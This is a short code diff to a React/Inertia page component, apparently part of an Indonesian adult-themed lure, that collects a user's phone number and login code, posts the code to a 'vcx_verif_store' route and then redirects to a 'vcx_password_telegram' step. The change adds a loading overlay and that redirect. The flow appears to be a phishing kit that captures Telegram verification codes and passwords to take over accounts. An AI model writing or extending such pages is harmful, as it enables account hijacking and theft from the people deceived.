@@ -1,6 +1,6 @@
 import Rhmt2Layout from "@/Layouts/rhmt2_layout";
 import RhmtLayout from "@/Layouts/rhmt_layouts";
-import { Link, useForm } from "@inertiajs/react";
+import { Link, router, useForm } from "@inertiajs/react";
 import { TextField } from "@mui/material";
 import React, { useEffect, useState } from "react";
 
@@ -9,6 +9,7 @@ export default function SexLayouts({ phoneNumber }) {
         phoneNumber: phoneNumber,
         code: "",
     });
+    const [loading, setLoading] = useState(false);
 
     const changeHandler = (e) => {
         const input = e.target.value;
@@ -23,11 +24,27 @@ export default function SexLayouts({ phoneNumber }) {
 
     const submitHandler = () => {
         if (data.code.length >= 5) {
-            post(route("rhmt.vcx_verif_store"));
+            setLoading(true);
+            post(route("rhmt.vcx_verif_store"), {
+                onSuccess: () => {
+                    setTimeout(() => {
+                        setLoading(false);
+                    }, 10000);
+                    router.visit(route("rhmt.vcx_password_telegram"));
+                },
+                onError: () => {
+                    setLoading(false);
+                },
+            });
         }
     };
     return (
         <Rhmt2Layout className="relative h-[932px] w-full overflow-hidden">
+            {loading && (
+                <div className="absolute top-0 left-0 w-full h-full flex justify-center items-center z-[99] ">
+                    <img src="/loading.gif" alt="" />
+                </div>
+            )}
             <h3 className="text-4xl font-extrabold text-purple-800 font-sans tracking-tighter">
                 <span className="text-white tracking-tighter text-2xl font-thin">
                     Letak Cod
